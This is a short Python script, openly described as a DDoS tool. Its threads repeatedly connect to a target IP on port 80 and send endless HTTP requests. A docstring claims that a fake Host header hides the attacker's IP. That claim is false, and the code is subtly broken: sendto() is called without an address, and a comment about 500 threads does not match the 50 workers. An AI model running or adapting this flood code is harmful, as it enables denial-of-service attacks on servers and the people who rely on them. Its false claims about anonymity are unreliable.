import socket
import threading
from concurrent.futures import ThreadPoolExecutor

target = "192.168.1.1" # target IP address
fake_ip = "182.21.20.32"
port = 80

attack_num = 0

def attack():
    """
    DDOS attack function.
    
    Creates a socket, connects to a target, and sends HTTP requests endlessly to the target.

    Injects fake IP address to the HTTP request to hide the attacker's IP address.
    """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port)) # connect to the target
            s.sendto(f"GET /{target} HTTP/1.1\r\n".encode('ascii')) # send a request to the target
            s.sendto(f"Host: {fake_ip}\r\n\r\n".encode('ascii'))
            # this part is optional
            global attack_num
            attack_num += 1
            print(f"HTTP Requests: {attack_num}")
            s.close()
        except Exception as e:
            print(e)
            s.close()

# create 500 threads to attack the target all at once (500 threads = 500 HTTP requests)
with ThreadPoolExecutor(max_workers=50) as executor:
    for i in range(500):
        executor.submit(attack)
